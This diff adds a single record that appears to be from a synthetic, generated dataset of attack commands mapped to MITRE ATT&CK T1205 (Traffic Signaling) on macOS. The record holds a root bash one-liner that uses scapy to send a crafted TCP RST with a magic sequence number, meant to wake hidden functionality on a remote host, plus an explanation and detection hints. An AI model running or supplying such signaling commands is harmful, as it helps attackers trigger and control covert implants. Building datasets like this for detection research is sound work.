@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'python3 - << \"PY\"\\nfrom scapy.all import IP, TCP, send\\npkt = IP(dst=\"198.51.100.77\")/TCP(dport=443, flags=\"R\", seq=0x41414141)\\nsend(pkt, verbose=0)\\nPY'",
+  "explanation": "Sends a crafted TCP RST with a magic sequence number (0x41414141) to 198.51.100.77:443 as a signaling packet to awaken hidden functionality on the remote end. Raw sockets require sudo/root.",
+  "rationale_steps": [
+    "Leverage unusual TCP control packet fields as a signaling channel.",
+    "No obfuscation; relies on header values unlikely in normal flows.",
+    "Detection: NIDS rules for odd TCP RSTs with fixed sequences; correlation with remote service behavior changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-9156f766",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
